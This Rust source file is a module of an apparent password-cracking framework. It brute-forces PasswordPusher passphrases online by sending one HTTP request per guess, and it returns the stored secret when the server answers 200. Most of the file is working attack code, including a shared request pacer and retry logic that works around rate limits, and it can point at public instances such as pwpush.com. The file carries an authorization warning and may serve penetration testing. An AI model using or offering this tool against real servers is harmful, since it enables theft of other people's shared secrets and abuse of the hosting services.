//! PasswordPusher target module.
//!
//! PasswordPusher (<https://github.com/pglombardo/PasswordPusher>, public
//! instances <https://pwpush.com> / <https://eu.pwpush.com>) is **not** a
//! zero-knowledge service like the other two targets, and this changes the whole
//! shape of the attack.
//!
//! * The payload is encrypted **at rest on the server** (Lockbox AES-256-GCM)
//!   under a random 256-bit master key (`PWPUSH_MASTER_KEY`) the server holds.
//!   It is **not** derived from any user password, so there is nothing offline to
//!   brute-force there.
//! * The optional **passphrase** is *not* a KDF input either. The server simply
//!   does a constant-time **string compare** of the stored passphrase against the
//!   one supplied on retrieval (`ActiveSupport::SecurityUtils.secure_compare`).
//!
//! So unlike yopass / PrivateBin there is **no downloadable ciphertext whose
//! password we can recover locally**. The only thing that knows whether a
//! passphrase is correct is a *running server* holding that push. This target is
//! therefore the framework's first **online** target: each candidate is one HTTP
//! request.
//!
//! Retrieval API (see the API v1 `PushesController#show`):
//!   `GET {base}/p/{token}.json?passphrase=<candidate>`
//!   * **401** + `{"error":"That passphrase is incorrect."}` — wrong/missing
//!     passphrase. This is our clean **miss** (and is logged server-side as a
//!     failed-passphrase event).
//!   * **200** with a JSON `payload` — correct passphrase; this is our **hit**.
//!     ⚠️  A successful retrieval **counts as a view** and can delete a
//!     view-limited push.
//!
//! ⚠️  **Authorized use only.** An online passphrase guesser sends traffic to a
//! live server, leaves an audit trail, and burns views on success. Only run it
//! against an instance you are authorized to test — e.g. your own self-hosted
//! PasswordPusher (the `pglombardo/pwpush` Docker image); see `docs/pwpush.md`.

use std::sync::Mutex;
use std::thread;
use std::time::{Duration, Instant};

use anyhow::{anyhow, bail, Context, Result};
use serde_json::Value;

use crate::target::Target;

/// Where a push lives: a server base URL and the secret URL token.
#[derive(Debug, Clone)]
pub struct PushLocation {
    /// Everything up to (not including) the `/p/<token>` segment, e.g.
    /// `https://pwpush.com` or `http://localhost:5100`.
    pub base_url: String,
    /// The secret URL token (the random push identifier).
    pub token: String,
}

impl PushLocation {
    /// Parse a push URL: `scheme://host[/path]/p/<token>` (also accepts the
    /// retrieval-step `/r/<token>` form, a trailing `.json`, and query/fragment
    /// noise, which are stripped).
    pub fn from_share_url(url: &str) -> Result<Self> {
        let no_frag = url.split('#').next().unwrap_or(url);
        let no_query = no_frag.split('?').next().unwrap_or(no_frag);

        // The push lives under `/p/<token>` (or the `/r/<token>` retrieval page).
        let idx = no_query
            .find("/p/")
            .or_else(|| no_query.find("/r/"))
            .ok_or_else(|| {
                anyhow!("not a PasswordPusher push URL (no '/p/<token>' segment): {url}")
            })?;
        let base = &no_query[..idx];
        let rest = &no_query[idx + 3..]; // skip the "/p/" (or "/r/") marker
        let token = rest.split('/').next().unwrap_or("").trim();
        let token = token.strip_suffix(".json").unwrap_or(token);
        if token.is_empty() {
            bail!("empty push token in {url}");
        }
        Ok(Self {
            base_url: base.trim_end_matches('/').to_string(),
            token: token.to_string(),
        })
    }

    /// Build from an explicit server base URL + push token.
    pub fn from_parts(server: &str, token: &str) -> Result<Self> {
        let token = token.trim();
        if token.is_empty() {
            bail!("empty push token");
        }
        Ok(Self {
            base_url: server.trim_end_matches('/').to_string(),
            token: token.to_string(),
        })
    }

    /// The JSON retrieval endpoint (passphrase is added as a query param).
    pub fn endpoint(&self) -> String {
        format!("{}/p/{}.json", self.base_url, self.token)
    }
}

/// How the server's HTTP status maps onto the [`Target`] contract.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Disposition {
    /// 200 — the passphrase was accepted (refine via the body for an expired push).
    Hit,
    /// 401 — wrong/missing passphrase: a clean miss, the common case.
    Miss,
    /// 429 — rate limited: back off and retry, don't burn the candidate.
    RateLimited,
    /// 404/410 — the push is gone/expired: fatal, there is nothing left to crack.
    Expired,
    /// Anything else: unexpected, treat as fatal rather than silently miss.
    Fatal,
}

/// Classify an HTTP status code. Pure (no body, no I/O) so it is unit-testable.
fn classify_status(status: u16) -> Disposition {
    match status {
        200 => Disposition::Hit,
        401 => Disposition::Miss,
        429 => Disposition::RateLimited,
        404 | 410 => Disposition::Expired,
        _ => Disposition::Fatal,
    }
}

/// Extract the secret from a successful (`200`) `show.json` body.
///
/// Returns `Some(payload)` only for an *active* push that actually carried a
/// payload; `None` when the body says the push is expired or carries no payload
/// (a 200 with no secret — e.g. an already-burned view-limited push).
fn extract_payload(body: &str) -> Option<Vec<u8>> {
    let doc: Value = serde_json::from_str(body).ok()?;
    if doc.get("expired").and_then(Value::as_bool) == Some(true) {
        return None;
    }
    match doc.get("payload").and_then(Value::as_str) {
        Some(p) if !p.is_empty() => Some(p.as_bytes().to_vec()),
        _ => None,
    }
}

/// A shared minimum-interval pacer. Because the runner clones one `Arc<dyn
/// Target>` across all workers, this throttles the *total* request rate, not the
/// per-thread rate — the whole point for an online target.
struct Pace {
    interval: Duration,
    /// The earliest instant the next request may start.
    next: Mutex<Instant>,
}

impl Pace {
    fn new(interval: Duration) -> Self {
        Self { interval, next: Mutex::new(Instant::now()) }
    }

    /// Block until the next request is allowed, then reserve the following slot.
    fn wait(&self) {
        if self.interval.is_zero() {
            return;
        }
        let mut next = self.next.lock().unwrap();
        let now = Instant::now();
        if *next > now {
            thread::sleep(*next - now);
        }
        // Reserve the next slot from whichever is later (now vs. the reservation),
        // so a burst of threads spaces out instead of stampeding.
        *next = (*next).max(Instant::now()) + self.interval;
    }
}

/// An **online** PasswordPusher passphrase-guessing target.
pub struct PwpushTarget {
    endpoint: String,
    agent: ureq::Agent,
    pace: Pace,
    max_retries: u32,
    retry_base: Duration,
    retry_max: Duration,
    name: String,
}

impl PwpushTarget {
    /// Build a target for a push location. `delay` is the minimum interval
    /// between requests (use `Duration::ZERO` for localhost; be polite to shared
    /// servers).
    pub fn new(loc: &PushLocation, delay: Duration) -> Self {
        let agent: ureq::Agent = ureq::Agent::config_builder()
            .timeout_connect(Some(Duration::from_secs(10)))
            .timeout_global(Some(Duration::from_secs(30)))
            // Return 4xx/5xx as Ok(response) so we can classify the status code
            // (401 miss vs 200 hit vs 429 rate-limit) instead of an error variant.
            .http_status_as_error(false)
            .build()
            .into();
        Self {
            endpoint: loc.endpoint(),
            agent,
            pace: Pace::new(delay),
            max_retries: 5,
            retry_base: Duration::from_millis(500),
            retry_max: Duration::from_secs(30),
            name: "pwpush".to_string(),
        }
    }
}

/// Parse a `Retry-After: <seconds>` header into a duration, if present.
fn retry_after(resp: &ureq::http::Response<ureq::Body>) -> Option<Duration> {
    resp.headers()
        .get("Retry-After")?
        .to_str()
        .ok()?
        .trim()
        .parse::<u64>()
        .ok()
        .map(Duration::from_secs)
}

impl Target for PwpushTarget {
    fn try_candidate(&self, candidate: &[u8]) -> Result<Option<Vec<u8>>> {
        // The passphrase is sent as a URL query param, so it must be valid UTF-8.
        // A non-UTF-8 candidate cannot be the passphrase over this transport — a
        // clean miss, never a fatal error.
        let pw = match std::str::from_utf8(candidate) {
            Ok(s) => s,
            Err(_) => return Ok(None),
        };

        let mut backoff = self.retry_base;
        for _ in 0..=self.max_retries {
            self.pace.wait();

            let mut resp = match self
                .agent
                .get(&self.endpoint)
                .query("passphrase", pw)
                .call()
            {
                Ok(r) => r,
                // Connection-level error (server starting up, network blip):
                // back off and retry rather than abort the whole run.
                Err(ureq::Error::Timeout(_))
                | Err(ureq::Error::Io(_))
                | Err(ureq::Error::ConnectionFailed) => {
                    thread::sleep(backoff);
                    backoff = (backoff * 2).min(self.retry_max);
                    continue;
                }
                Err(e) => bail!("PasswordPusher request failed: {e}"),
            };
            let code = resp.status().as_u16();

            match classify_status(code) {
                Disposition::Hit => {
                    let body = resp
                        .body_mut()
                        .read_to_string()
                        .context("reading PasswordPusher response body")?;
                    return match extract_payload(&body) {
                        Some(p) => Ok(Some(p)),
                        // 200 with no usable payload: the push is expired/burned.
                        // Structural, not a wrong guess — fatal, don't loop the keyspace.
                        None => bail!(
                            "server returned HTTP 200 without a payload — the push is \
                             expired or already burned; nothing left to crack"
                        ),
                    };
                }
                Disposition::Miss => return Ok(None),
                Disposition::Expired => bail!(
                    "push not found or expired (HTTP {code}); nothing to crack \
                     (re-create the push, or check the token/server)"
                ),
                Disposition::Fatal => bail!(
                    "unexpected HTTP {code} from PasswordPusher (not a passphrase result)"
                ),
                Disposition::RateLimited => {
                    let wait = retry_after(&resp).unwrap_or(backoff);
                    thread::sleep(wait);
                    backoff = (backoff * 2).min(self.retry_max);
                    continue;
                }
            }
        }
        bail!(
            "giving up after {} retries of rate-limit/transport errors from \
             PasswordPusher — increase --delay-ms or reduce --threads",
            self.max_retries
        )
    }

    fn name(&self) -> &str {
        &self.name
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_push_url() {
        let loc = PushLocation::from_share_url("https://pwpush.com/p/abc123xyz").unwrap();
        assert_eq!(loc.base_url, "https://pwpush.com");
        assert_eq!(loc.token, "abc123xyz");
        assert_eq!(loc.endpoint(), "https://pwpush.com/p/abc123xyz.json");
    }

    #[test]
    fn parse_url_strips_json_query_and_fragment() {
        let loc =
            PushLocation::from_share_url("http://localhost:5100/p/tok.json?x=1#frag").unwrap();
        assert_eq!(loc.base_url, "http://localhost:5100");
        assert_eq!(loc.token, "tok");
    }

    #[test]
    fn parse_retrieval_step_and_subpath() {
        let loc = PushLocation::from_share_url("https://host.example/pwp/r/deadbeef").unwrap();
        assert_eq!(loc.base_url, "https://host.example/pwp");
        assert_eq!(loc.token, "deadbeef");
    }

    #[test]
    fn from_parts_trims_trailing_slash() {
        let loc = PushLocation::from_parts("http://localhost:5100/", "tok").unwrap();
        assert_eq!(loc.endpoint(), "http://localhost:5100/p/tok.json");
    }

    #[test]
    fn reject_url_without_push_segment() {
        assert!(PushLocation::from_share_url("https://pwpush.com/about").is_err());
        assert!(PushLocation::from_share_url("https://pwpush.com/p/").is_err());
    }

    #[test]
    fn status_classification() {
        assert_eq!(classify_status(200), Disposition::Hit);
        assert_eq!(classify_status(401), Disposition::Miss);
        assert_eq!(classify_status(429), Disposition::RateLimited);
        assert_eq!(classify_status(404), Disposition::Expired);
        assert_eq!(classify_status(410), Disposition::Expired);
        assert_eq!(classify_status(500), Disposition::Fatal);
        assert_eq!(classify_status(403), Disposition::Fatal);
    }

    #[test]
    fn payload_extracted_from_active_hit() {
        let body = r#"{"payload":"the secret","expired":false,"views_remaining":4}"#;
        assert_eq!(extract_payload(body).unwrap(), b"the secret");
    }

    #[test]
    fn expired_or_empty_200_is_not_a_payload() {
        assert!(extract_payload(r#"{"payload":"x","expired":true}"#).is_none());
        assert!(extract_payload(r#"{"expired":false}"#).is_none());
        assert!(extract_payload(r#"{"payload":""}"#).is_none());
        assert!(extract_payload("not json").is_none());
    }
}
